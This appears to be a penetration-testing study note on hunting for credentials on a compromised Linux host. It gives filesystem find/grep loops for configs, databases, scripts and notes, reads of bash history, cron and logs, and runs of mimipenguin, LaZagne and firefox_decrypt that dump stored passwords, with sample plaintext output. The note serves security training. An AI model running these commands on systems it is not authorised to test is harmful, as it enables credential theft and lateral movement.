# Password Attacks - Credential Hunting in Linux

## Overview

Credential hunting is one of the first things to do after gaining access to a Linux system. These are often the easiest wins during post-exploitation and can lead to:

- privilege escalation
- lateral movement
- password reuse opportunities
- access to databases, services, and internal systems

If we gain a shell through something like a vulnerable web app or a reverse shell, one of the fastest ways to improve our position is to search for credentials already present on the host.

A useful way to think about Linux credential hunting is to split it into four broad categories:

- **Files**
- **History**
- **Memory / Cache**
- **Keyrings / Stored Credentials**

These categories include, but are not limited to:

- config files
- databases
- notes
- scripts
- cronjobs
- SSH keys
- shell history
- logs
- memory-resident credentials
- browser-stored credentials

---

## Why context matters

Credential hunting should not be random.

You should always think about:

- what the system is for
- who uses it
- what services run on it
- how it fits into the wider environment
- which credentials are most likely to exist there

### Example

If you land on a **database server**, you are more likely to find:

- database connection strings
- service account credentials
- backup scripts
- cronjobs
- application configs

You are less likely to find lots of normal user artefacts compared to a desktop or jump box.

---

# Files

## Why files matter

A core Linux idea is that **everything is a file**.  
That makes file hunting one of the most productive credential-hunting methods.

The most useful file categories to inspect are:

- configuration files
- databases
- notes
- scripts
- cronjobs
- SSH keys

---

## Configuration files

Configuration files often contain:

- usernames
- passwords
- tokens
- service settings
- database connection strings
- hardcoded secrets

Common config extensions include:

- `.config`
- `.conf`
- `.cnf`

These extensions are common, but not mandatory. Some applications use custom names or uncommon paths.

---

## Searching for configuration files

A quick way to enumerate common config files:

```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

### What this does

- loops through common config extensions
- searches the full filesystem
- suppresses permission errors with `2>/dev/null`
- excludes noisy directories like `lib`, `fonts`, `share`, and `core`

This gives a broad list of candidate config files worth reviewing.

---

## Grepping configs for credentials

Once config files are found, grep them for likely credential strings:

```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

### Why this helps

This can quickly reveal:

- database usernames
- database passwords
- service account credentials
- authentication parameters

The `grep -v "\#"` part helps remove commented lines so you are left with more useful results.

---

## Databases

### Why databases matter

Database files may contain:

- stored credentials
- application data
- tokens
- usernames
- API keys
- cached secrets

Sometimes the credential is not inside the config file but inside the database the application uses.

---

## Searching for database files

```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

### Common things you may find

- SQLite databases
- browser databases
- cache DBs
- application storage
- local metadata stores

Not every `.db` file is useful, but browser and app-specific databases are often worth checking.

---

## Notes

### Why notes matter

Admins, developers, and users often leave informal notes containing:

- passwords
- URLs
- account names
- internal instructions
- temporary secrets

These may not always use obvious names like `passwords.txt`.

---

## Searching for notes and text files

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

### Why this works

This looks for:

- `.txt` files
- files with no extension

Files without extensions are often overlooked and may contain notes or copied credentials.

---

## Scripts

### Why scripts matter

Scripts often contain credentials because they need to automate tasks such as:

- database access
- backups
- API calls
- service restarts
- file transfer
- authentication to other systems

If an admin wanted a task to run unattended, credentials are often embedded.

---

## Searching for scripts

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

### Why this helps

This identifies script or source-code locations where you may find:

- hardcoded usernames and passwords
- tokens
- private keys
- connection strings
- authentication logic

Shell scripts (`.sh`) are especially common places for credential leakage.

---

## Cronjobs

### Why cronjobs matter

Cronjobs run commands or scripts automatically. They often depend on:

- scripts
- service accounts
- backup jobs
- scheduled data pulls
- authentication to remote systems

Because cron runs unattended, credentials are often stored insecurely.

---

## Checking cron configuration

System-wide cron table:

```bash
cat /etc/crontab
```

Cron directories:

```bash
ls -la /etc/cron.*/
```

### Important locations

- `/etc/crontab`
- `/etc/cron.d/`
- `/etc/cron.daily/`
- `/etc/cron.hourly/`
- `/etc/cron.weekly/`
- `/etc/cron.monthly/`

### Why this matters

You want to identify:

- what runs automatically
- who runs it
- which script paths are used
- whether those scripts contain credentials
- whether writable scripts could be abused

---

# History

## Why history matters

Command history is often one of the fastest ways to recover credentials.

Users commonly type:

- passwords directly into commands
- API keys
- database connection strings
- `su` commands
- scripts with embedded passwords

History also shows how the system is used.

---

## Enumerating shell history

```bash
tail -n5 /home/*/.bash*
```

### Useful files to check

- `.bash_history`
- `.bashrc`
- `.bash_profile`

### What to look for

- `su`
- `sudo`
- `mysql -u ... -p...`
- scripts run with plaintext passwords
- URLs with credentials
- tokens in environment variables

Example clue:

```bash
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK
```

---

## Log files

### Why logs matter

Logs help you understand:

- authentication events
- failed or successful logins
- sudo activity
- service usage
- password changes
- command execution

They may also expose usernames or operational mistakes.

---

## Important log files

| File | Description |
|------|------------|
| /var/log/messages | Generic system activity logs |
| /var/log/syslog | Generic system activity logs |
| /var/log/auth.log | Authentication logs (Debian) |
| /var/log/secure | Authentication logs (RHEL/CentOS) |
| /var/log/boot.log | Boot logs |
| /var/log/dmesg | Hardware logs |
| /var/log/kern.log | Kernel logs |
| /var/log/faillog | Failed login attempts |
| /var/log/cron | Cron logs |
| /var/log/mail.log | Mail server logs |
| /var/log/httpd | Apache logs |
| /var/log/mysqld.log | MySQL logs |

---

## Searching logs for useful events

```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

---

# Memory and Cache

## Mimipenguin

Many applications store credentials temporarily in memory.

Mimipenguin can extract credentials from memory and processes.

```bash
sudo python3 mimipenguin.py
```

Example output:

```
[SYSTEM - GNOME] cry0l1t3:WLpAEXFa0SbqOHY
```

Requires root privileges.

---

## LaZagne

LaZagne extracts credentials from many sources.

```bash
sudo python2.7 laZagne.py all
```

Or browser-specific:

```bash
python3 laZagne.py browsers
```

Sources include:

- Wifi
- browsers
- SSH
- Git
- AWS
- Docker
- keyrings
- Keepass
- environment variables
- shadow hashes
- sessions

---

# Browser Credentials

## Firefox credential storage

Firefox stores credentials in:

```bash
~/.mozilla/firefox/
```

List profiles:

```bash
ls -l .mozilla/firefox/ | grep default
```

Credentials stored in:

```bash
logins.json
```

Example:

```bash
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

---

## Decrypt Firefox credentials

Tool:

```bash
python3.9 firefox_decrypt.py
```

Extracts:

- usernames
- passwords
- URLs

---

# High-Value Credential Locations

Prioritise:

- config files
- scripts
- cronjobs
- bash history
- SSH keys
- browser credentials
- log files
- local databases
- memory artefacts

---

# Quick Commands

## Config files

```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

## Databases

```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

## Notes

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

## Scripts

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

## Cronjobs

```bash
cat /etc/crontab
```

```bash
ls -la /etc/cron.*/
```

## History

```bash
tail -n5 /home/*/.bash*
```

## Logs

```bash
grep -Ri "password" /var/log 2>/dev/null
```

## Mimipenguin

```bash
sudo python3 mimipenguin.py
```

## LaZagne

```bash
sudo python2.7 laZagne.py all
```

```bash
python3 laZagne.py browsers
```

## Firefox

```bash
cat ~/.mozilla/firefox/*.default*/logins.json | jq .
```

```bash
python3.9 firefox_decrypt.py
```

---

# Tags

#password-attacks
#credential-hunting
#linux
#privilege-escalation
#post-exploitation
#enumeration
#obsidian